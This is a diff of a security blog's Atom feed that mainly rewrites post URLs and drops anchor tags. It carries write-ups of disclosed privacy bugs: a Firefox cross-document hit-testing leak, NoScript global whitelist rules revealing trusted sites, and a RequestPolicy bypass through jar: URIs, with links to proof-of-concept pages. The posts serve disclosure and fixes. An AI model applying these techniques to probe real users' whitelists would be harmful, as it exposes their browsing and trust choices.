 <p>Note that the last Firefox version these actually work in is <code>26</code>, if you want to try them out you&rsquo;ll have to find a download for it.</p>
@@ -630,12 +1016,10 @@ the same timing attack as <code>caretPositionFromPoint</code>.</p>
 </ul>
 
 
-<a name="The.Fix"></a>
 <h2>The Fix</h2>
 
 <p>Judging from <a href="https://hg.mozilla.org/mozilla-central/rev/cdbe5779c728">Robert O&#8217;Callahan&rsquo;s fix</a>, it looks like Firefox was using a general hit testing function that descended cross-document for both <code>elementFromPoint</code> and <code>caretPositionFromPoint</code>. The fix was to disable cross-document descent in the hit testing function when called by either <code>elementFromPoint</code> or <code>caretPositionFromPoint</code>.</p>
 
-<a name="Disclosure.Timeline"></a>
 <h2>Disclosure Timeline</h2>
 
 <ul>
@@ -655,12 +1039,11 @@ the same timing attack as <code>caretPositionFromPoint</code>.</p>
   
   <entry>
     <title type="html"><![CDATA[Abusing NoScript's Global Whitelist Rules to Reveal Trusted Sites (the Easy Way)]]></title>
-    <link href="http://JordanMilne.github.io/2013/12/18/abusing-noscripts-global-whitelist-rules-to-reveal-trusted-sites-the-easy-way/"/>
+    <link href="http://blog.saynotolinux.com/blog/2013/12/18/abusing-noscripts-global-whitelist-rules-to-reveal-trusted-sites-the-easy-way/"/>
     <updated>2013-12-18T03:58:17-04:00</updated>
-    <id>http://JordanMilne.github.io/2013/12/18/abusing-noscripts-global-whitelist-rules-to-reveal-trusted-sites-the-easy-way</id>
+    <id>http://blog.saynotolinux.com/blog/2013/12/18/abusing-noscripts-global-whitelist-rules-to-reveal-trusted-sites-the-easy-way</id>
     <content type="html"><![CDATA[<p>Here&rsquo;s one that&rsquo;s been <a href="http://www.w2spconf.com/2011/papers/jspriv.pdf">covered a bit before</a>: <a href="http://noscript.net/">NoScript</a> makes it easy for whitelisted sites to see what other sites are on the whitelist.</p>
 
-<a name="So.what.s.the.issue."></a>
 <h2>So what&rsquo;s the issue?</h2>
 
 <p>Most of the pertinent info is in the previous paper, but I&rsquo;ll give a brief summary. By default NoScript operates in whitelist mode, forbidding scripts from all domains. Once a site has been added to the whitelist, scripts from that domain <em>as well as those included from other whitelisted domains</em> may be executed on the page.</p>
@@ -690,7 +1073,6 @@ visited that site.</p>
 
 <p>If you have google.com whitelisted, this will say &ldquo;google loaded!&rdquo;. Otherwise (or if google.com is down for some reason) this will print &ldquo;google failed&rdquo;.</p>
 
-<a name="Cool..let.s.see.it.in.action."></a>
 <h2>Cool, let&rsquo;s see it in action!</h2>
 
 <p><a href="http://saynotolinux.com/tests/noscript/whitelist_disclosure.html">Here&rsquo;s an example</a> of how the attack may be used, including a timing attack based on the <a href="http://blog.saynotolinux.com/2013/11/bypassing-requestpolicys-whitelist.html">RequestPolicy bypass described in my last post</a>. Mind, the timing attack is a bit spotty, and generally doesn&rsquo;t work on
@@ -698,9 +1080,8 @@ the first page load. Refresh the page if it doesn&rsquo;t work the first time.</
 
 <p>If you don&rsquo;t have either RequestPolicy or NoScript installed, here&rsquo;s what you should see:</p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/whitelist-disclosure.png"><img src="http://JordanMilne.github.io/images/posts/whitelist-disclosure.png"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/whitelist-disclosure.png"><img src="http://blog.saynotolinux.com/images/posts/whitelist-disclosure.png"></a></p>
 
-<a name="How.can.it.be.fixed."></a>
 <h2>How can it be fixed?</h2>
 
 <p>Global whitelist entries by their very nature leak info to any other site on the whitelist. This won&rsquo;t be fixed in NoScript until support for per-site whitelists is added and people are encouraged to remove their old global rules.</p>
@@ -711,9 +1092,9 @@ the first page load. Refresh the page if it doesn&rsquo;t work the first time.</
   
   <entry>
     <title type="html"><![CDATA[Bypassing RequestPolicy's Whitelist Using the Jar: URI Scheme]]></title>
-    <link href="http://JordanMilne.github.io/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme/"/>
+    <link href="http://blog.saynotolinux.com/blog/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme/"/>
     <updated>2013-11-29T04:11:39-04:00</updated>
-    <id>http://JordanMilne.github.io/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme</id>
+    <id>http://blog.saynotolinux.com/blog/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme</id>
     <content type="html"><![CDATA[<p>Here&rsquo;s an interesting bug I found while looking at some cross-domain data-stealing issues.
 It&rsquo;s possible to bypass <a href="https://www.requestpolicy.com/about.html">RequestPolicy</a>&rsquo;s whitelist entirely by referencing a resource nested in a <a href="http://www.gnucitizen.org/blog/web-mayhem-firefoxs-jar-protocol-issues/">jar URI</a>:</p>
 
@@ -741,18 +1122,17 @@ Since all <a href="https://github.com/RequestPolicy/requestpolicy/blob/20815944f
 I&rsquo;m not sure if the patch has any interactions with extensions, but it should also fix issues with
 nested use of the view-source scheme (which for some reason doesn&rsquo;t implement <a href="http://dxr.mozilla.org/mozilla-central/source/netwerk/base/public/nsINestedURI.idl">nsINestedURI</a>)</p>
 
-<a name="Proof-of-Concept"></a>
 <h2>Proof-of-Concept</h2>
 
 <p>If you&rsquo;d like to see whether or not you&rsquo;re vulnerable, <a href="http://saynotolinux.com/tests/requestpolicy_jar.html">I&rsquo;ve made a Proof-of-Concept</a> that detects whether or not RequestPolicy blocked an image from a jar URI.</p>
 
 <p>Without the patch:</p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/jar-broken.png"><img src="http://JordanMilne.github.io/images/posts/jar-broken.png"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/jar-broken.png"><img src="http://blog.saynotolinux.com/images/posts/jar-broken.png"></a></p>
 
 <p>With the patch:</p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/jar-fixed.png"><img src="http://JordanMilne.github.io/images/posts/jar-fixed.png"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/jar-fixed.png"><img src="http://blog.saynotolinux.com/images/posts/jar-fixed.png"></a></p>
 ]]></content>
   </entry>
   
